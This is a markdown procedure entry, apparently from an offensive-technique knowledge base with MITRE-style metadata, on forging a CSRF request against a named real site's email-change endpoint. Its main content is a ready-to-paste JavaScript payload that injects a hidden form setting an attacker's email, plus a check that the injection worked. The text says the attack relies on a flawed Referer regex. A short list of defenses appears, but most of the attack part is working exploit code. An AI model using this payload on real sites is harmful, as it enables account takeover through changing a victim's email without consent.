---
id: proc-uuid-4
tags:
  - csrf
  - javascript-injection
type: procedure
tools:
  - '[[tools/Safari-JavaScript-Console]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/create-csrf-form-injection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:49.671Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-CSRF-Form-via-JavaScript

## Summary

This procedure uses JavaScript in Safari's console to create and append a hidden form that targets the CSRF-vulnerable endpoint, enabling unauthorized submission.

## Description

The JS dynamically builds a POST form to /change_email with an attacker email, appending it visibly for manual trigger. The malicious domain ensures the Referer passes validation due to the regex flaw.

## Requirements

1. Active malicious page loaded in Safari
2. Developer tools open with console
3. Attacker email prepared

## Defense

Defensive measures and detection strategies:

- Require CSRF tokens on all state-changing endpoints
- Validate Origin header alongside Referer
- Set Content-Type to application/json for APIs to block form submits

## Objectives

1. Forge a request mimicking an authenticated action
2. Bypass browser and server checks
3. Prepare for submission

## Instructions

### Step 1: Paste Payload in Console

**Context**: Input the JS to construct the form.

**Command** ([[commands/create-csrf-form-injection]]):
```javascript
var FormEl = `<form action="https://new.cs.money/change_email" method="POST"><input type="hidden" name="email" value="nnez+attacker@wearehackerone.com" /><button type="submit" style="font-size:28pt;z-index:99999">Submit</button></form>`; var Div = document.createElement('div'); Div.innerHTML = FormEl; document.body.appendChild(Div);
```

> This creates a div, sets innerHTML to the form with hidden email input and styled button, then appends to body. Expected: No errors, form visible.

### Step 2: Verify DOM Injection

**Context**: Confirm the element is added.

Execute `document.querySelector('form[action*="change_email"]')` in console.

> Expected: Returns the form element.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/create-csrf-form-injection]]

## Tools Used

- [[tools/Safari-JavaScript-Console]]

## Tags

- csrf
- javascript-injection
